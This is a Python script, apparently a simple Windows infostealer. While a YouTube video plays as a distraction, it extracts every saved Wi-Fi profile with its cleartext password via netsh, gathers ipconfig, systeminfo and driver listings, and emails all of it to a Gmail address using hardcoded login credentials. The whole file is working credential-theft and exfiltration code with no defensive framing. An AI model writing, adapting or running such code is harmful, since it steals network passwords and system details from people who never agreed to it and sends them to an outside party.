import subprocess
import platform
import smtplib
import webbrowser
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
webbrowser.open("https://youtu.be/edocx5HW8Hc?t=31")

txt = open("mytxt.txt", "a")
print("Check 1 Passed...:)")

meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
data = meta_data.decode('utf-8', errors="backslashreplace")
data = data.split('\n')
names = []
print("Check 2 Passed...:)")
for i in data:
    if "All User Profile" in i:
        i = i.split(":")
        i = i[1]
        i = i[1:-1]
        names.append(i)
print("Check 3 Passed...:)")

for name in names:
    key = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear').decode('utf-8')
    txt.write(f"{key}\n")
print("Check 4 Passed...:)")

ipINFO = subprocess.check_output("ipconfig").decode('utf-8')
systeminfo = subprocess.check_output("systeminfo").decode('utf-8')
driverinfo = subprocess.check_output("driverquery").decode('utf-8')

my_system = platform.uname()
info = f"System is: {my_system.system}\nNode Name is: {my_system.node}\nRelease is: {my_system.release}\nVersion is: {my_system.version}\nMachine is: {my_system.machine}\nProcessor is: {my_system.processor}\nIPINFO:{ipINFO}\nSYSTEMINFO:{systeminfo}\nDRIVERINFO:{driverinfo}"
INFOx = str(info)
txt.write(f"{INFOx}\n")
print("Check 5 Passed...:)")

mail_content = ""
sender_address = 'alliswell7778869@gmail.com'
sender_pass = 'sasorifeelnopains'
receiver_address = sender_address
message = MIMEMultipart()
message['From'] = sender_address
message['To'] = receiver_address
message['Subject'] = 'Data for HBRAR hehe'
message.attach(MIMEText(mail_content, 'plain'))
attach_file_name = 'mytxt.txt'
attach_file = open(attach_file_name, 'rb')
print("Check 6 Passed...:)")
payload = MIMEBase('application', 'octate-stream')
payload.set_payload((attach_file).read())
encoders.encode_base64(payload)
payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
message.attach(payload)
session = smtplib.SMTP('smtp.gmail.com', 587)
session.starttls()
session.login(sender_address, sender_pass)
print("Check 7 Passed...:)")
text = message.as_string()
session.sendmail(sender_address, receiver_address, text)
session.quit()
print('Complete Hogi :)')
